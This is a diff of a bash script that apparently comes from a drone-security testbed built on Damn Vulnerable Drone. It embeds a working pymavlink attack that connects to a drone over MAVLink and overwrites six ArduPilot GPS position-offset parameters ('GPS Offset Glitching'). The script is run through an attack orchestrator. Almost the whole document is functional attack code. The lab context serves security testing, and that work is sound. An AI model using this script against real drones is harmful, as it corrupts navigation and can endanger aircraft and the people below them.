@@ -1,98 +1,115 @@
 #!/usr/bin/env bash
-
-# --- Process Command Line Arguments ---
-# Example: Assign first arg to INTENSITY, default 'medium'
-# INTENSITY="${1:-medium}"
-# Example: Assign second arg to DURATION_SECONDS, default '30'
-# DURATION_SECONDS="${2:-30}"
-# echo "Parameters: Intensity=$INTENSITY, Duration=$DURATION_SECONDS"
-# Add more parameter processing as needed for the specific script
-# ------------------------------------
-
-# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/GPS-Offset-Glitching.md
-# Created: 2025-09-14 13:46:03
-# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
+# Auto-generated from: GPS-Offset-Glitching.md
+set -euo pipefail
 
 # MTD_INTERFACE_START
 # =======================================================================
-# MTD-aware Target Acquisition (from Orchestrator Environment)
-# =======================================================================
-# 이 스크립트는 attack_orchestrator.py에 의해 TARGET_IP와 TARGET_PORT 환경 변수가
-# 설정될 것을 기대하고 실행됩니다.
-
+# MTD 환경 변수를 통한 동적 타겟 획득
 if [[ -z "${TARGET_IP:-}" || -z "${TARGET_PORT:-}" ]]; then
     echo "ERROR: TARGET_IP and TARGET_PORT environment variables are not set." >&2
-    echo "This script must be run via the attack_orchestrator.py" >&2
+    echo "Attack aborted. Must be run via attack_orchestrator.py with MTD state resolution." >&2
     exit 1
 fi
 
-echo "[INFO] Attack target acquired from orchestrator: ${TARGET_IP}:${TARGET_PORT}"
+# 서비스 타입에 따라 TARGET_PORT 기본값 설정
+# GPS Offset Glitching은 MAVLink 파라미터 설정을 이용하며, MAVLink TCP 포트 5760을 가정합니다.
+case "${TARGET_SERVICE:-DRONE_MAVLINK_TCP}" in
+  DRONE_MAVLINK_TCP)
+    TARGET_PORT="${TARGET_PORT:-5760}" # 기본 MAVLink TCP 포트
+    ;;
+  DRONE_MAVLINK)
+    TARGET_PORT="${TARGET_PORT:-14550}" # 일반 MAVLink UDP 포트 (예비)
+    ;;
+  *)
+    :
+    ;;
+esac
+
+echo "[INFO] Attack target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-DRONE_MAVLINK_TCP})"
 # MTD_INTERFACE_END
 
-set -euo pipefail
-
-# 기준 경로 (요구사항)
+# 기준 경로 및 로깅 설정
 export BASE="${BASE:-$PWD}"
-
-# 공통 로그 연결(선택사항) - 존재 시 로드
 if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
-  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
-  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
+    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
+    log(){ echo "[$(date +%F_%T)] $*"; }; export -f log
 fi
 
 log "[ATTACK] id=gps-offset-glitching src=GPS-Offset-Glitching.md"
-log "[BLOCK 1] type=python"
-python3 - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
-# --- argv glue for converter ---
-import os, sys, re
-if len(sys.argv) <= 1:
-    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:${TARGET_IP}:14550')
-    if ep.startswith('udp:'):
-        try:
-            _, rest = ep.split(':', 1)
-            ep = rest
-        except ValueError:
-            pass
-    # expect ip:port
-    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
-        sys.argv = [sys.argv[0], ep]
+log "[BLOCK 1] type=python (Inline GPS Offset Glitching Attack)"
+
+# MAVLink PARAM_SET 명령을 이용해 GPS 오프셋을 설정하는 Python 인라인 스크립트 실행
+# 오케스트레이터가 인수로 "최대 오프셋 값" (예: 10.0)을 TARGET_IP:PORT 뒤에 추가 주입한다고 가정합니다.
+# 원본 스크립트의 실행 예시: sudo python3 gps_offset_attack.py ${TARGET_IP}:5760 10
+MAX_OFFSET_VALUE="${1:-10.0}" # 첫 번째 인수로 오프셋 값을 받거나 기본값 10.0 사용
+
+python3 -u - "${TARGET_IP}:${TARGET_PORT}" "${MAX_OFFSET_VALUE}" <<'PY'
+import os, sys
+import time
 from pymavlink import mavutil
-import sys
 
-def connect_drone(target_ip, target_port):
-    master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
-    master.wait_heartbeat()
-    print("Connected to the drone.")
-    return master
+# --- Argument Parsing from Shell ---
+if len(sys.argv) < 3:
+    # 인수가 부족할 경우 환경 변수와 기본값으로 대체 (오케스트레이터 통합 시)
+    target_ip = os.environ.get('TARGET_IP', '127.0.0.1')
+    target_port = os.environ.get('TARGET_PORT', '5760')
+    max_offset = float(os.environ.get('MAX_OFFSET_VALUE', '10.0')) # 환경 변수 또는 하드코딩된 기본값 사용
+    print(f"[INFO] Using environment fallback: {target_ip}:{target_port} with offset {max_offset}")
+else:
+    # 쉘 스크립트에서 전달된 인수 사용 (IP:PORT, MAX_OFFSET_VALUE)
+    target_ip, target_port_str = sys.argv[1].split(':')
+    target_port = int(target_port_str)
+    try:
+        max_offset = float(sys.argv[2])
+    except ValueError:
+        print(f"[ERROR] Invalid offset value: {sys.argv[2]}", file=sys.stderr)
+        sys.exit(1)
+# -----------------------------------
 
-def set_gps_position_offset(master, param_name, offset_value):
+def connect_drone(ip: str, port: int):
+    """MAVLink TCP 연결을 시도하고 하트비트를 기다립니다."""
+    connection_string = f'tcp:{ip}:{port}'
+    try:
+        master = mavutil.mavlink_connection(connection_string)
+        master.wait_heartbeat()
+        print(f"[INFO] Connected to the drone via {connection_string}.")
+        return master
+    except Exception as e:
+        print(f"[ERROR] Failed to connect to drone: {e}", file=sys.stderr)
+        sys.exit(1)
+
+def set_param(master, param_id, param_value, param_type):
+    """MAVLink PARAM_SET 메시지를 전송합니다."""
+    # param_id는 16바이트로 패딩되어야 합니다.
+    param_id_padded = param_id.encode('utf-8')[:16].ljust(16, b'\x00')
     master.mav.param_set_send(
         master.target_system,
         master.target_component,
-        param_name.encode('utf-8'),
-        offset_value,
-        mavutil.mavlink.MAV_PARAM_TYPE_REAL32
+        param_id_padded,
+        param_value,
+        param_type
     )
-    print(f"{param_name} set to {offset_value}")
+    print(f"[>] PARAM_SET sent: {param_id} = {param_value}")
 
 def main(target_ip, target_port, max_offset):
     master = connect_drone(target_ip, target_port)
+    
+    # 공격 대상 GPS 오프셋 파라미터 리스트 (ArduPilot의 EKF3/GPS 관련 파라미터)
     gps_params = ['GPS_POS1_X', 'GPS_POS1_Y', 'GPS_POS1_Z', 
                   'GPS_POS2_X', 'GPS_POS2_Y', 'GPS_POS2_Z']
+    
+    print(f"[INFO] Starting GPS Position Offset Glitching with offset: {max_offset} meters.")
+    
     for param in gps_params:
-        set_gps_position_offset(master, param, max_offset)
+        # 오프셋 값을 설정 (float 타입인 REAL32 사용)
+        set_param(master, param, max_offset, mavutil.mavlink.MAV_PARAM_TYPE_REAL32)
+        time.sleep(0.1) # 짧은 지연
+
+    print("[INFO] All GPS offset parameters modified. Attack complete.")
 
 if __name__ == "__main__":
-    if len(sys.argv) != 3:
-        print("Usage: python gps_offset_attack.py <target_ip:port> <max_offset>")
-        sys.exit(1)
-
-    target = sys.argv[1]
-    target_ip, target_port = target.split(':')
-    target_port = int(target_port)
-    max_offset = float(sys.argv[2])
     main(target_ip, target_port, max_offset)
 PY
 
-log "[BLOCK 2] type=shell"
-sudo python3 gps_offset_attack.py ${TARGET_IP}:5760 10
+log "[BLOCK 2] type=control (Execution Complete)"
+log "Parameter injection attack finished execution."
